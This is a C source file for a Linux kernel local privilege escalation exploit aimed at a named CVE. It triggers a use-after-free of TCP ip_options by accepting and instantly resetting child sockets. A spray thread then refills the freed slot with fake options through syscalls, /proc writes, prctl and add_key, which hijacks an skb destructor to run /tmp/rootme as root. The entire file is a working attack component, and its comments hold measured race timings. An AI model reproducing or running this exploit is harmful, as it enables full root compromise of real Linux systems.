/* acceptor.c - THE CONTROLLED-FREE ENGINE for CVE-2026-98432.
 *
 * The child socket created at handshake completion inherits ireq_opt
 * (tcp_v4_syn_recv_sock: newinet->inet_opt = ireq->ireq_opt; the req's
 * pointer is NULLed). The previous runs let the backlog overflow destroy
 * these children IN THE SOFTIRQ - the freed slot ping-ponged straight back
 * into the storm's own save_options and no spray could ever win it.
 *
 * This listener ACCEPTS each child and CLOSES it immediately:
 *   close() -> inet_sock_destruct -> kfree(inet_opt)   [OUR process ctx, OUR cpu]
 * and a dedicated spray thread concurrently re-plants the fake ip_options with
 * a bucket-matched spray call:
 *   spray alloc -> per-CPU freelist LIFO pop of a just-freed slot
 *              -> writes the fake ip_options into it
 *
 * Meanwhile the retransmit reader races on another CPU: it loaded
 * ireq->ireq_opt BEFORE the child creation NULLed it, and the stretch kprobes
 * delay its field reads ~20-40us - past our free+plant. Its
 * ip_options_build then reads the PLANTED fake options and performs the
 * deep writes into its own SYN-ACK shinfo:
 *   srr write = daddr (X)      at iph+67+iph[68]-4 = iph+172 = shinfo+8
 *   rr  write = rt source (Y)  at iph+68+iph[70]-5 = iph+176 = shinfo+12
 *   -> frag_list = X|Y<<32 = the fake skb staged by rce_prep
 *   -> the SYN-ACK is freed -> kfree_skb_list_reason walks frag_list
 *   -> skb->destructor(skb) = call_usermodehelper_exec(fake subprocess_info)
 *   -> a kworker execs /tmp/rootme as uid 0.  Root.
 *
 * Usage: acceptor <runtime_s> <cpu> <mode> [path]
 *   mode: ssa  - lsm_set_self_attr syscall (NR 460), memdup_user before checks
 *         attr - write /proc/self/attr/current (proc_pid_attr_write memdup_user)
 *         file - write <path> (any memdup_user{,_nul} file: filter etc.)
 *         avn  - prctl(PR_SET_VMA_ANON_NAME) (anon_vma_name_alloc kstrdup)
 * The mode's call site must hash (GOLDEN_RATIO_64 ^ seed) into the same
 * RANDOM_KMALLOC_CACHES bucket as tcp_v4_route_req+0x91 - the run script
 * picks it per boot.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#ifndef __NR_lsm_set_self_attr
#define __NR_lsm_set_self_attr 460
#endif

#define PORT 9700
#define CNT 88
#define KEY_SPEC_PROCESS_KEYRING -2

static unsigned char payload[CNT];
static unsigned char kpayload[72];   /* user_key_payload: data starts at +24 */

/* dedicated spray thread: re-plant the payload continuously (the freed slot
 * must still hold OUR bytes when the stretched reader reads it ~20-40us
 * after the free; a foreign allocation in that window otherwise wins) */
static volatile int g_run = 1;
static const char *g_mode_s, *g_path_s;
static void *spray_thread(void *arg)
{
    (void)arg;
    if (!strcmp(g_mode_s, "ssa")) {
        while (g_run)
            syscall(__NR_lsm_set_self_attr, 1, payload, CNT, 0);
    } else if (!strcmp(g_mode_s, "attr") || !strcmp(g_mode_s, "file")) {
        while (g_run) {
            int fd = open(g_path_s, O_WRONLY);
            if (fd >= 0) { ssize_t w = write(fd, payload, CNT); (void)w; close(fd); }
        }
    } else if (!strcmp(g_mode_s, "avn")) {
        static char vnbuf[4096] __attribute__((aligned(4096)));
        while (g_run)
            prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME,
                  (unsigned long)vnbuf, 4096UL, (unsigned long)payload);
    } else if (!strcmp(g_mode_s, "keyhold")) {
        /* user_key_payload { rcu_head(16), datalen(2), pad(6), data[] }:
         * the payload starts at object+24, so kpayload[0] == optlen. */
        unsigned long n = 0;
        char desc[24];
        while (g_run) {
            for (int i = 0; i < 64 && g_run; i++) {
                snprintf(desc, sizeof(desc), "k%lu", n++);
                syscall(SYS_add_key, "user", desc, kpayload,
                        sizeof(kpayload), KEY_SPEC_PROCESS_KEYRING);
            }
        }
    }
    return NULL;
}

static void build_payload(void)
{
    int safe = getenv("ACCEPTOR_SAFE") != NULL;
    /* buffer IS the object: fake ip_options_rcu, ip_options at +16 */
    memset(payload, 0x41, sizeof(payload));
    payload[16] = 32; payload[17] = 32; payload[18] = 32; payload[19] = 32; /* faddr */
    payload[24] = 40;    /* optlen */
    /* ip_options_build writes the srr field UNCONDITIONALLY when srr != 0,
     * independent of the flags. Safe mode must zero srr/rr/ts as well. */
    payload[25] = safe ? 0 : 67;    /* srr -> iph+172 (shinfo+8, frag_list low  = X) */
    payload[26] = safe ? 0 : 68;    /* rr  -> iph+176 (shinfo+12, frag_list high = Y) */
    payload[27] = safe ? 0 : 69;    /* ts  -> iph+160 (harmless tailroom) */
    payload[28] = safe ? 0x00 : 0x28;  /* flags */
    payload[32] = 0x44;  /* __data: printable TS option */
    payload[33] = 0x28;
    payload[34] = 0x25;
    payload[35] = 0x20;
}

static void build_key_payload(void)
{
    int safe = getenv("ACCEPTOR_SAFE") != NULL;
    /* keyhold layout: object+24 == kpayload[0] */
    memset(kpayload, 0x41, sizeof(kpayload));
    kpayload[0] = 40;    /* object+24  optlen */
    kpayload[1] = safe ? 0 : 67;    /* object+25  srr    */
    kpayload[2] = safe ? 0 : 68;    /* object+26  rr     */
    kpayload[3] = safe ? 0 : 69;    /* object+27  ts     */
    kpayload[4] = safe ? 0x00 : 0x28;  /* object+28 flags */
    kpayload[8]  = 0x44; /* object+32  __data: printable TS option */
    kpayload[9]  = 0x28;
    kpayload[10] = 0x25;
    kpayload[11] = 0x20;
    kpayload[15] = 0x41; kpayload[16] = 0x42;   /* object+39 s1 = 0x44434241 */
    kpayload[17] = 0x43; kpayload[18] = 0x44;
    kpayload[23] = 0x45; kpayload[24] = 0x46;   /* object+47 s3 = 0x48474645 */
    kpayload[25] = 0x47; kpayload[26] = 0x48;
}

int main(int argc, char **argv)
{
    int runtime = argc > 1 ? atoi(argv[1]) : 60;
    int cpu     = argc > 2 ? atoi(argv[2]) : 0;
    const char *mode = argc > 3 ? argv[3] : "ssa";
    const char *path = argc > 4 ? argv[4] : "/proc/self/attr/current";
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);
    build_payload();
    build_key_payload();

    /* avn mode: a region of pages to name */
    char *vn = NULL;
    size_t vn_pg = 0, vn_max = 0;
    if (!strcmp(mode, "avn")) {
        vn_max = 1u << 14;   /* 16k pages = 64MB of names, no populate */
        vn = mmap(NULL, vn_max * 4096UL, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (vn == MAP_FAILED) { perror("mmap avn"); return 1; }
    }

    int proto_num = 262;
    if (argc > 5 && !strcmp(argv[5], "tcp")) proto_num = IPPROTO_TCP;
    int ls = socket(AF_INET, SOCK_STREAM, proto_num);
    if (ls < 0) { perror("socket(262)"); return 1; }
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_ANY);
    a.sin_port = htons(PORT);
    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) < 0) { perror("bind"); return 1; }
    if (listen(ls, 1024) < 0) { perror("listen"); return 1; }
    int fl = fcntl(ls, F_GETFL, 0);
    fcntl(ls, F_SETFL, fl | O_NONBLOCK);   /* busy-poll accept: the free must
        land us (not ms) after the child is queued, inside the reader window */
    fprintf(stderr, "[acceptor] listening :%d cpu=%d mode=%s proto=%d\n", PORT, cpu, mode, proto_num);
    fflush(stderr);
    g_mode_s = mode; g_path_s = path;
    pthread_t spray_th;
    if (pthread_create(&spray_th, NULL, spray_thread, NULL) != 0)
        perror("pthread_create(spray)");

    unsigned long acc = 0, planted = 0, err = 0;
    time_t t0 = time(NULL), last_hb = t0;
    while ((int)(time(NULL) - t0) < runtime) {
        int c = accept(ls, NULL, NULL);
        if (c < 0) {
            if (errno == EINTR || errno == EAGAIN) continue;
            perror("accept"); break;
        }
        /* free + plant immediately */
        /* THE FREE: child destroy -> inet_sock_destruct -> kfree(inet_opt),
         * synchronously in THIS process context on THIS cpu.
         * SO_LINGER{1,0} is essential: a plain close() on the ESTABLISHED
         * child sends a FIN and LINGERS in FIN_WAIT (the storm never ACKs
         * the FIN) - inet_sock_destruct is deferred by tcp_fin_timeout
         * (measured: frees=1 in 10s without it). SO_LINGER forces an RST and
         * an immediate destroy: the free lands us after the child is queued,
         * inside the retransmit reader's 20-40us field-read window. */
        struct linger lg = { .l_onoff = 1, .l_linger = 0 };
        setsockopt(c, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
        close(c);
        acc++;
        /* NOTE: the plant is done ONLY by the dedicated spray thread (max
         * rate, keeps the freed slot topped with our payload). Planting here
         * too slows the accept loop (open/write/close per child) and delays
         * the free ~150us past the reader window - measured free delay was
         * 193us with the inline plant. accept+close must be ~us-fast. */
        (void)planted; (void)err; (void)vn; (void)vn_pg; (void)vn_max;
        if ((long)(time(NULL) - last_hb) >= 2) {
            fprintf(stderr, "[hb] accepted=%lu planted=%lu err=%lu\n", acc, planted, err);
            fflush(stderr);
            last_hb = time(NULL);
        }
    }
    g_run = 0;
    fprintf(stderr, "[acceptor] accepted=%lu planted=%lu err=%lu\n", acc, planted, err);
    return 0;
}
